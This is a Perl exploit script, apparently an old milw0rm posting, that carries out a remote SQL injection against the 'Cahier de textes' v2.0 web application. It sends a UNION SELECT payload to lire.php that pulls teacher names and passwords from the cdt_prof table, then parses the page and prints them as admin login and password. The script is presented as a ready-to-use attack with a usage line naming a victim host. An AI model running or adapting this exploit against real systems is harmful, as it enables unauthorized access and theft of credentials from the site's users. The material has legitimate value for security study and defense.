# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#             Cahier  de  textes  
#   Pierre Lemaitre - St Lô (France) - Ver 2.0
#           
#          Remote SQL injection Exploit
#
#              Discovred By s4mi
#           s4mi[at]linuxmail[dot]org
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# exploit Coded by simo64
#
# all thanks to simo64,drackanz,hardose,r00t 
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#
#
#!/usr/bin/perl

use IO::Socket ;

&header();

&usage unless(defined($ARGV[0] && $ARGV[1]));

$host = $ARGV[0];
$path = $ARGV[1];

syswrite STDOUT ,"\nConnecting ...";

my $sock = new IO::Socket::INET ( PeerAddr => "$host",PeerPort => "80",Proto => "tcp",);
								
die "\nUnable to connect to $host\n" unless($sock);

syswrite STDOUT, "[OK]";

$inject = "1&matiere_ID=-1+union%20select%20null,CONCAT(nom_prof,CHAR(58),CHAR(58),passe)%20FROM%20cdt_prof/*";	

syswrite STDOUT ,"\nSending Data ...";

print $sock "GET $path/lire.php?classe_ID=1&matiere_ID=$inject HTTP/1.1\n";
print $sock "Host: $host\n";
print $sock "Referer: $host\n";
print $sock "Accept-Language: en-us\n";
print $sock "Content-Type: application/x-www-form-urlencoded\n";
print $sock "User-Agent: Mozilla/5.0 (BeOS; U; BeOS X.6; en-US; rv:1.7.8) Gecko/20050511 Firefox/1.0.4\n";
print $sock "Cache-Control: no-cache\n";
print $sock "Connection: Close\n\n";

syswrite STDOUT ,"[OK]\n\n";

	while($res = <$sock>){
	#print $res;sleep(1);
		if($res =~ /class="Style6">(.*?)::(.*?)<\/td>/){
			print "Exploit Succeded !\n\n";sleep(1);
			$userlogin = $1 ;
			$userpass  = $2;
			print "adminlogin  : $userlogin\n";sleep(1);
			print "adminpasswd : $userpass\n";sleep(1);
			$succeded = "ok";
			}
		}
if(!defined($succeded)) {print "\nExploit Failed\n";} else {print "\nEnjoy ;)";}

sub usage{
	print "\nUsage   : perl $0 host /path/ ";
	print "\nExemple : perl $0 www.victime.net /cahier/\n";
	exit(0);
}
sub header(){
print q(
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
            Cahier  de  textes  v2.0 
   Pierre Lemaitre - St Lô (France) - Ver 2.0

       Remote SQL injection Exploit by s4mi
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
);
}

# milw0rm.com [2006-10-07]